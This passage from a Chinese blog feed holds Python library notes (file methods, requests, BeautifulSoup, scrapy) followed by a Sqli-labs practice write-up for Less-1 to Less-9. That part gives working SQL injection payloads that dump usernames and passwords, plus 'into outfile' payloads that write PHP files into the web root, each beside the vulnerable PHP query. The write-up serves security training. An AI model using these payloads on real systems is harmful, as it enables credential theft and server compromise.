align="center">以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。如果该文件不存在，创建新文件用于读写。</td></tr></tbody></table><p>默认为文本模式，如果要以二进制模式打开，加上 <code>b</code> 。</p><p>file 对象使用 open 函数来创建，下表列出了 file 对象常用的函数：</p><table><thead><tr><th align="center">序号</th><th align="center">方法及描述</th></tr></thead><tbody><tr><td align="center">1</td><td align="center"><a href="https://www.runoob.com/python/file-close.html" target="_blank" rel="noopener"><code>file.close()</code></a>关闭文件。关闭后文件不能再进行读写操作。</td></tr><tr><td align="center">2</td><td align="center"><a href="https://www.runoob.com/python/file-flush.html" target="_blank" rel="noopener"><code>file.flush()</code></a>刷新文件内部缓冲，直接把内部缓冲区的数据立刻写入文件, 而不是被动的等待输出缓冲区写入。</td></tr><tr><td align="center">3</td><td align="center"><a href="https://www.runoob.com/python/file-fileno.html" target="_blank" rel="noopener"><code>file.fileno()</code></a>返回一个整型的文件描述符(file descriptor FD 整型), 可以用在如os模块的read方法等一些底层操作上。</td></tr><tr><td align="center">4</td><td align="center"><a href="https://www.runoob.com/python/file-isatty.html" target="_blank" rel="noopener"><code>file.isatty()</code></a>如果文件连接到一个终端设备返回 True，否则返回 False。</td></tr><tr><td align="center">5</td><td align="center"><a href="https://www.runoob.com/python/file-next.html" target="_blank" rel="noopener"><code>file.next()</code></a>返回文件下一行。</td></tr><tr><td align="center">6</td><td align="center"><a href="https://www.runoob.com/python/python-file-read.html" target="_blank" rel="noopener"><code>file.read([size])</code></a>从文件读取指定的字节数，如果未给定或为负则读取所有。</td></tr><tr><td align="center">7</td><td align="center"><a href="https://www.runoob.com/python/file-readline.html" target="_blank" rel="noopener"><code>file.readline([size])</code></a>读取整行，包括 “\n” 字符。</td></tr><tr><td align="center">8</td><td align="center"><a href="https://www.runoob.com/python/file-readlines.html" target="_blank" rel="noopener"><code>file.readlines([sizeint])</code></a>读取所有行并返回列表，若给定sizeint&gt;0，则是设置一次读多少字节，这是为了减轻读取压力。</td></tr><tr><td align="center">9</td><td align="center"><a href="https://www.runoob.com/python/file-seek.html" target="_blank" rel="noopener"><code>file.seek(offset[, whence])</code></a>设置文件当前位置</td></tr><tr><td align="center">10</td><td align="center"><a href="https://www.runoob.com/python/file-tell.html" target="_blank" rel="noopener"><code>file.tell()</code></a>返回文件当前位置。</td></tr><tr><td align="center">11</td><td align="center"><a href="https://www.runoob.com/python/file-truncate.html" target="_blank" rel="noopener"><code>file.truncate([size])</code></a>截取文件，截取的字节通过size指定，默认为当前文件位置。</td></tr><tr><td align="center">12</td><td align="center"><a href="https://www.runoob.com/python/python-file-write.html" target="_blank" rel="noopener"><code>file.write(str)</code></a>将字符串写入文件，返回的是写入的字符长度。</td></tr><tr><td align="center">13</td><td align="center"><a href="https://www.runoob.com/python/file-writelines.html" target="_blank" rel="noopener"><code>file.writelines(sequence)</code></a>向文件写入一个序列字符串列表，如果需要换行则要自己加入每行的换行符。</td></tr></tbody></table><h1 id="一些库"><a href="#一些库" class="headerlink" title="一些库"></a>一些库</h1><h2 id="OS"><a href="#OS" class="headerlink" title="OS"></a>OS</h2><h3 id="OS库路径操作"><a href="#OS库路径操作" class="headerlink" title="OS库路径操作"></a>OS库路径操作</h3><img src="https://i.loli.net/2020/03/27/74xtvaDndBfLJyA.png" alt="image-20200210121104519" style="zoom:50%;" /><img src="https://i.loli.net/2020/03/27/Lo14paDzvNYrhP6.png" alt="image-20200210121210427" style="zoom:50%;" /><img src="https://i.loli.net/2020/03/27/BzagGFjtyYUOiRm.png" alt="image-20200210121239874" style="zoom:50%;" /><img src="https://i.loli.net/2020/03/27/L8HInF5gOsm2zev.png" alt="image-20200210121259753" style="zoom:50%;" /><p>os.path.getsize(path)：返回path对应文件的大小，以字节为单位&gt;&gt;&gt;os.path.getsize(“c:/1.txt”)   ——&gt;   123</p><h3 id="OS库进程管理"><a href="#OS库进程管理" class="headerlink" title="OS库进程管理"></a>OS库进程管理</h3><p>os.system(command)———–执行程序或命令command，在Windows中返回值为cmd的调用返回信息</p><h3 id="OS库环境参数"><a href="#OS库环境参数" class="headerlink" title="OS库环境参数"></a>OS库环境参数</h3><img src="https://i.loli.net/2020/03/27/915EQqgMKHlYWZG.png" alt="image-20200210122033256" style="zoom:50%;" /><table><thead><tr><th align="center">函数</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">os.getlogin()</td><td align="center">获得当前系统登录用户名称</td></tr><tr><td align="center">os.cpu_count()</td><td align="center">获得当前系统的CPU数量</td></tr></tbody></table><img src="https://i.loli.net/2020/03/27/wKoWXNSaJQBykU1.png" alt="image-20200210133215349" style="zoom:50%;" /><h2 id="wordcloud"><a href="#wordcloud" class="headerlink" title="wordcloud"></a>wordcloud</h2><p>配置对象参数—&gt;加载词云文本—&gt;输出词云文件</p><blockquote><p>分隔：以空格分隔单词</p><p>统计：单词出现次数并过滤</p><p>字体：根据统计配置字号</p><p>布局：颜色环境尺寸</p></blockquote><table><thead><tr><th align="center">方法</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">w.generate(txt)</td><td align="center">向WordCloud对象w中加载文本txt &gt;&gt;&gt;<code>w.generate(&quot;Python and WordCloud&quot;)</code></td></tr><tr><td align="center">w.to_file(filename)</td><td align="center">将词云输出为图像文件，<code>.png</code>或<code>.jpg</code>格式 &gt;&gt;&gt;<code>w.to_file(&quot;outfile.png&quot;)</code></td></tr></tbody></table><p>w.wordcloud.WordCloud()参数：</p><table><thead><tr><th align="center">参数</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">min_font_size</td><td align="center">指定词云中字体的最小字体，默认4 &gt;&gt;&gt;w=wordcloud.WordCloud(min_font_size=10)</td></tr><tr><td align="center">max_font_size</td><td align="center">指定词云中字体的最大字号，根据高度自动调节  &gt;&gt;&gt;w=wordcloud.WordCloud(max_font_size=20)</td></tr><tr><td align="center">font_step</td><td align="center">指定词云中字体字号的步进间隔，默认为1 &gt;&gt;&gt;w=wordcloud.WordCloud(font_step=2)</td></tr><tr><td align="center">width</td><td align="center">指定词云对象生成图片的宽度，默认400像素 &gt;&gt;&gt; w= wordcloud.WordCloud(width=600)</td></tr><tr><td align="center">height</td><td align="center">指定词云对象生成图片的高度，默认200像素 &gt;&gt;&gt;w= wordcloud.WordCloud(width=400)</td></tr><tr><td align="center">font_path</td><td align="center">指定字体文件的路径，默认None &gt;&gt;&gt; w=wordcloud.WordCloud(font_path=”msyh.ttc”)</td></tr><tr><td align="center">max-words</td><td align="center">指定词云显示的最大单词数量，默认200 &gt;&gt;&gt; w= wordcloud.WordCloud(max_words=20)</td></tr><tr><td align="center">stop_word</td><td align="center">指定词云的排除列表，即不显示单词列表&gt;&gt;&gt; w= wordcloud.WordCloud(stop_words={“Python”})</td></tr><tr><td align="center">mask</td><td align="center">指定词云形状，默认为长方形，需要引用imread()函数&gt;&gt;&gt;from scipy.misc import imread &gt;&gt;&gt; mk = imread(“pic.png”) &gt;&gt;&gt; w = wordcloud.WordCloud(mask=mk)</td></tr><tr><td align="center">background_color</td><td align="center">指定词云图片的背景颜色，默认为红黑色 &gt;&gt;&gt; w= wordcloud.WordCloud(background_color=”white”)</td></tr></tbody></table><h2 id="PyInstaller"><a href="#PyInstaller" class="headerlink" title="PyInstaller"></a>PyInstaller</h2><p>打包.py文件为.exe应用程序</p><img src="https://i.loli.net/2020/03/27/7341zjdQJyusDiB.png" alt="image-20200205161232599" style="zoom:50%;" /><h2 id="pip"><a href="#pip" class="headerlink" title="pip"></a>pip</h2><table><thead><tr><th align="center">使用方法</th><th align="center">功能</th></tr></thead><tbody><tr><td align="center">pip install &lt;第三方库名&gt;</td><td align="center">安装第三方库</td></tr><tr><td align="center">pip install -U &lt;第三方库名&gt;</td><td align="center">更新第三方库</td></tr><tr><td align="center">pip uninstall &lt;第三方库名&gt;</td><td align="center">卸载第三方库</td></tr><tr><td align="center">pip download &lt;第三方库名&gt;</td><td align="center">下载但不安装指定的第三方库</td></tr><tr><td align="center">pip show &lt;第三方库名&gt;</td><td align="center">列出某个指定第三方库的详细信息</td></tr><tr><td align="center">pip search &lt;关键字&gt;</td><td align="center">根据关键词在名称和介绍中搜索第三方库</td></tr><tr><td align="center">pip list</td><td align="center">列出当前系统的python版本已经安装的第三方库</td></tr></tbody></table><h2 id="requests"><a href="#requests" class="headerlink" title="requests"></a>requests</h2><h3 id="主要方法"><a href="#主要方法" class="headerlink" title="主要方法"></a>主要方法</h3><table><thead><tr><th align="center">方法</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">requests.requset(method,url,**kwargs)</td><td align="center">构造一个请求，支撑以下各方法的基础方法</td></tr><tr><td align="center">requests.get(url,params=None,**kwargs)</td><td align="center">获取HTML网页的主要方法，对应于HTTP的GET</td></tr><tr><td align="center">requests.head(url,**kwargs)</td><td align="center">获取HTML网页头信息的方法，对应于HTTP的HEAD</td></tr><tr><td align="center">requests.post(url,data=None,json=None,**kwargs)</td><td align="center">向HTML网页提交POST请求的方法，对应于HTTP的POST</td></tr><tr><td align="center">requests.put(url,data=None,**kwargs)</td><td align="center">向HTML网页提交PUT请求的方法，对应于HTTP的PUT</td></tr><tr><td align="center">requests.patch(url,data=None,**kwargs)</td><td align="center">向HTML网页提交局部修改请求，对应于HTTP的PATCH</td></tr><tr><td align="center">requests.delete(url,**kwargs)</td><td align="center">向HTML页面提交删除请求，对应于HTTP的DELETE</td></tr></tbody></table><p>method：</p><blockquote><p>请求方式，GET,HEAD,POST,PUT,PATCH,DALETE,OPTIONS</p></blockquote><p>**kwargs：</p><p>控制访问的参数，均为可选项</p><blockquote><p>params：字典或字节序列，作为参数增加到url中</p><p>data：字典、字节序列或文件对象，作为Request的内容</p><p>json：JSON格式的数据，作为Request的内容</p><p>headers：字典，HTTP定制头</p><p>cookies：字典或CookieJar，Request中的cookie</p><p>auth：元祖，支持HTTP认证功能</p><p>files：字典类型，传输文件</p><p>timeout：设定超时时间，秒为单位</p><p>proxies：字典类型，设定访问代理服务器，可以增加登录认证</p><p>allow_redirects：True/False，默认为True，重定向开关</p><p>stream：True/False，默认为True，获取内容立即下载开关</p><p>verify：True/False，默认为True，认证SSL证书开关</p><p>cert：本地SSL证书路径</p></blockquote><h3 id="Requests库的异常"><a href="#Requests库的异常" class="headerlink" title="Requests库的异常"></a>Requests库的异常</h3><table><thead><tr><th align="center">异常</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">requests.ConnectionError</td><td align="center">网络连接错误异常，如DNS查询失败，拒绝连接等</td></tr><tr><td align="center">requests.HTTPError</td><td align="center">HTTP错误异常</td></tr><tr><td align="center">requests.URLRequired</td><td align="center">url缺失异常</td></tr><tr><td align="center">requests.TooManyRedirects</td><td align="center">超过最大重定向次数，产生重定向异常</td></tr><tr><td align="center">requests.ConnectTimeout</td><td align="center">连接远程服务器超时异常</td></tr><tr><td align="center">requests.Timeout</td><td align="center">请求URL超时，产生超时异常</td></tr></tbody></table><h3 id="Response对象属性"><a href="#Response对象属性" class="headerlink" title="Response对象属性"></a>Response对象属性</h3><table><thead><tr><th align="center">属性</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">r.status_code</td><td align="center">HTTP请求的返回状态，200表示连接成功，404表示失败</td></tr><tr><td align="center">r.text</td><td align="center">HTTP响应内容的字符串形式，即，url对应的页面内容</td></tr><tr><td align="center">r.encoding</td><td align="center">从HTTP header中猜测的响应内容编码方式</td></tr><tr><td align="center">r.apparent_encoding</td><td align="center">从内容中分析出响应内容编码的方式（备选编码方式）</td></tr><tr><td align="center">r.content</td><td align="center">HTTP响应内容的二进制形式</td></tr></tbody></table><h2 id="Beautiful-Soup"><a href="#Beautiful-Soup" class="headerlink" title="Beautiful Soup"></a>Beautiful Soup</h2><p>也叫beautifulsoup4或bs4</p><h3 id="基本元素"><a href="#基本元素" class="headerlink" title="基本元素"></a>基本元素</h3><img src="https://i.loli.net/2020/03/27/Tc8DqgmtkVen7bP.png" alt="image-20200215095808822" style="zoom:50%;" /><h3 id="遍历方法"><a href="#遍历方法" class="headerlink" title="遍历方法"></a>遍历方法</h3><img src="https://i.loli.net/2020/03/27/83rDy4VuRUmlSEX.png" alt="image-20200215102120777" style="zoom: 33%;" /><img src="https://i.loli.net/2020/03/27/BzcMtG3fKZ9YvLA.png" alt="image-20200215102525568" style="zoom:50%;" /><img src="https://i.loli.net/2020/03/27/1v5sgAwlKeE84ca.png" alt="image-20200215102442134" style="zoom:50%;" /><img src="https://i.loli.net/2020/03/27/HI37nwNVLrEUdaG.png" alt="image-20200215102747676" style="zoom: 50%;" /><p>注：平行遍历发生在同一个父节点下的各节点间</p><p><code>prettify()</code>格式化输出</p><h3 id="内容查找方法"><a href="#内容查找方法" class="headerlink" title="内容查找方法"></a>内容查找方法</h3><img src="https://i.loli.net/2020/03/27/kGwAfz9exDZyobT.png" alt="image-20200215110510847" style="zoom:50%;" /><img src="https://i.loli.net/2020/03/27/UIsSTuQM8b4OorJ.png" alt="image-20200215110603229" style="zoom:50%;" /><h3 id="Beautiful-Soup库解析器"><a href="#Beautiful-Soup库解析器" class="headerlink" title="Beautiful Soup库解析器"></a>Beautiful Soup库解析器</h3><table><thead><tr><th align="center">解析器</th><th align="center">使用方法</th><th align="center">条件</th></tr></thead><tbody><tr><td align="center">bs4的HTML解析器</td><td align="center">BeautifulSoup(mk,’html.parser’)</td><td align="center">安装bs4库</td></tr><tr><td align="center">lxml的HTML解析器</td><td align="center">BeautifulSoup(mk,’lxml’)</td><td align="center">pip install lxml</td></tr><tr><td align="center">lxml的XML解析器</td><td align="center">BeautifulSoup(mk,’xml’)</td><td align="center">pip install lxml</td></tr><tr><td align="center">html5lib的解析器</td><td align="center">BeautifulSoup(mk,’html5lib’)</td><td align="center">pip install html5lib</td></tr></tbody></table><h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><p>匹配中文字符：<code>[\u4e00-\u9fa5]</code></p><p>IP地址：<code>((?:(?:25[0-5]|2[0-4]\\d|[01]?\\d?\\d)\\.){3}(?:25[0-5]|2[0-4]\\d|[01]?\\d?\\d))</code></p><img src="https://i.loli.net/2020/03/27/Rvtk6bKeTjG4qcD.png" alt="image-20200215171503658" style="zoom:50%;" /><img src="https://i.loli.net/2020/03/27/Ic5oQKj7dDCphH6.png" alt="image-20200215171657835" style="zoom:50%;" /><h3 id="compile函数"><a href="#compile函数" class="headerlink" title="compile函数"></a>compile函数</h3><img src="https://i.loli.net/2020/03/27/XMJoyUin9Fk8bYv.png" alt="image-20200215172803741" style="zoom:50%;" /><h3 id="Match对象"><a href="#Match对象" class="headerlink" title="Match对象"></a>Match对象</h3><img src="https://i.loli.net/2020/03/27/ecKLfQhyPH79wEo.png" alt="image-20200215173026458" style="zoom:50%;" /><img src="https://i.loli.net/2020/03/27/8sOdP2EHLaS4Fyj.png" alt="image-20200215173130093" style="zoom:50%;" /><h3 id="最小匹配（非贪婪）"><a href="#最小匹配（非贪婪）" class="headerlink" title="最小匹配（非贪婪）"></a>最小匹配（非贪婪）</h3><img src="https://i.loli.net/2020/03/27/UdMYvojIbA58R3a.png" alt="image-20200215173716539" style="zoom:50%;" /><h2 id="string"><a href="#string" class="headerlink" title="string"></a>string</h2><p><a href="https://blog.csdn.net/github_36601823/article/details/77815013" target="_blank" rel="noopener">参考</a></p><img src="https://i.loli.net/2020/03/27/udki5zp6IjPnmVl.jpg" alt="img" style="zoom: 80%;" /><img src="https://i.loli.net/2020/03/27/LZ8NlFPnrTSRzvt.jpg" alt="img" style="zoom:80%;" /><h1 id="scrapy框架"><a href="#scrapy框架" class="headerlink" title="scrapy框架"></a>scrapy框架</h1><h2 id="主要结构"><a href="#主要结构" class="headerlink" title="主要结构"></a>主要结构</h2><img src="https://i.loli.net/2020/03/27/wdf3zTWagXblrGv.png" alt="image-20200217193013443" style="zoom:50%;" /><img src="https://i.loli.net/2020/03/27/7QvwsulAxEZF1he.png" alt="image-20200217193035116" style="zoom:50%;" /><img src="https://i.loli.net/2020/03/27/PLuUS1bO3kYEvlQ.png" alt="image-20200217193058864" style="zoom:50%;" /><img src="https://i.loli.net/2020/03/27/L369AQvZUXejY7f.png" alt="image-20200217193115484" style="zoom:50%;" /><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><img src="https://i.loli.net/2020/03/27/CPRDZJejIYNKBAo.png" alt="image-20200217193155782" style="zoom:50%;" /><h2 id="工程目录"><a href="#工程目录" class="headerlink" title="工程目录"></a>工程目录</h2><img src="https://i.loli.net/2020/03/27/TrCPS9vnfZE5whk.png" alt="image-20200217193245769" style="zoom:50%;" /><h2 id="类"><a href="#类" class="headerlink" title="类"></a>类</h2><h3 id="Request"><a href="#Request" class="headerlink" title="Request"></a>Request</h3><img src="https://i.loli.net/2020/03/27/8QhJNUp5gHv21iF.png" alt="image-20200217193435792" style="zoom:50%;" /><h3 id="Response"><a href="#Response" class="headerlink" title="Response"></a>Response</h3><img src="https://i.loli.net/2020/03/27/bj7MElpFzThDHN3.png" alt="image-20200217193520056" style="zoom:50%;" />]]></content>
      
      
      <categories>
          
          <category> 备忘录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sqli-labs靶场</title>
      <link href="/2020/01/24/Sqli-labs%E9%9D%B6%E5%9C%BA/"/>
      <url>/2020/01/24/Sqli-labs%E9%9D%B6%E5%9C%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a><strong>Less-</strong>1</h1><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0&#39; union select database(),group_concat(username),group_concat(password) from users--+</span><br></pre></td></tr></table></figure><p>php:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;&#39;$id&#39; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2020/03/27/AYUCfaTnPBtGyRJ.png" style="zoom:67%;" /><h1 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a><strong>Less-</strong>2</h1><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0 union select 1,group_concat(username),group_concat(password) from users --+</span><br></pre></td></tr></table></figure><p>php:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;$id LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure><h1 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a><strong>Less-3</strong></h1><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0&#39;) union select 1,group_concat(username),group_concat(password) from users --+</span><br></pre></td></tr></table></figure><p>php:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;(&#39;$id&#39;) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure><h1 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a><strong>Less-</strong>4</h1><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0&quot;) union select 1,group_concat(username),group_concat(password) from users --+</span><br></pre></td></tr></table></figure><p>php:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id &#x3D; &#39;&quot;&#39; . $id . &#39;&quot;&#39;;</span><br><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;($id) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure><h1 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a><strong>Less-</strong>5</h1><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0&#39; and extractvalue(1,concat(1,(select group_concat(username,&#39;:&#39;,password) from users where username!&#x3D;&#39;此处加入想排除的字符，可往后查找&#39;)))--+</span><br></pre></td></tr></table></figure><p>php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'&lt;font size="5" color="#FFFF00"&gt;'</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'You are in...........'</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font size="3" color="#FFFF00"&gt;'</span>;</span><br><span class="line">print_r(mysql_error());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;&lt;/font&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#0000ff" font size= 3&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2020/03/27/cmTbM8gyPwnQLJj.png" style="zoom:67%;" /><h1 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a><strong>Less-</strong>6</h1><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0&quot; and extractvalue(1,concat(1,(select group_concat(username,&#39;:&#39;,password) from users where username!&#x3D;&#39;此处加入想排除的字符，可往后查找&#39;)))--+</span><br></pre></td></tr></table></figure><p>php:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$id &#x3D; &#39;&quot;&#39;.$id.&#39;&quot;&#39;;</span><br><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;$id LIMIT 0,1&quot;;</span><br><span class="line">下面的同Less-5</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2020/03/27/lMcs9oPwIJW1Ud6.png" style="zoom:67%;" /><h1 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a><strong>Less-</strong>7</h1><p>Method：into outfile 文件写入操作，如下：</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;)) union select 1,2,&#39;&#39; into outfile &quot;C:\\xampp\\htdocs\\sqli\\Less-7\\1.php&quot; --+</span><br></pre></td></tr></table></figure><p>php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'You are in.... Use outfile......'</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'You have an error in your SQL syntax'</span>;</span><br><span class="line"><span class="comment">//print_r(mysql_error());</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a><strong>Less-</strong>8</h1><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; union select 1,2,&#39;&#39; into outfile &quot;C:\\xampp\\htdocs\\sqli\\Less-8\\1.php&quot; --+</span><br></pre></td></tr></table></figure><p>php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'&lt;font size="5" color="#FFFF00"&gt;'</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'You are in...........'</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font size="5" color="#FFFF00"&gt;'</span>;</span><br><span class="line"><span class="comment">//echo 'You are in...........';</span></span><br><span class="line"><span class="comment">//print_r(mysql_error());</span></span><br><span class="line"><span class="comment">//echo "You have an error in your SQL syntax";</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;&lt;/font&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#0000ff" font size= 3&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a><strong>Less-</strong>9</h1><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; union select 1,2,&#39;&#39; into outfile &quot;C:\\xampp\\htdocs\\sqli\\Less-9\\1.php&quot; --+</span><br></pre></td></tr></table></figure><p>php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'&lt;font size="5" color="#FFFF00"&gt;'</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'You are in...........'</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font size="5" color="#FFFF00"&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'You are in...........'</span>;</span><br><span class="line"><span class="comment">//print_r(mysql_error());</span></span><br><span class="line"><span class="comment">//echo "You have an error in your SQL syntax";</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;&lt;/font&gt;"</span>;</span><br><span 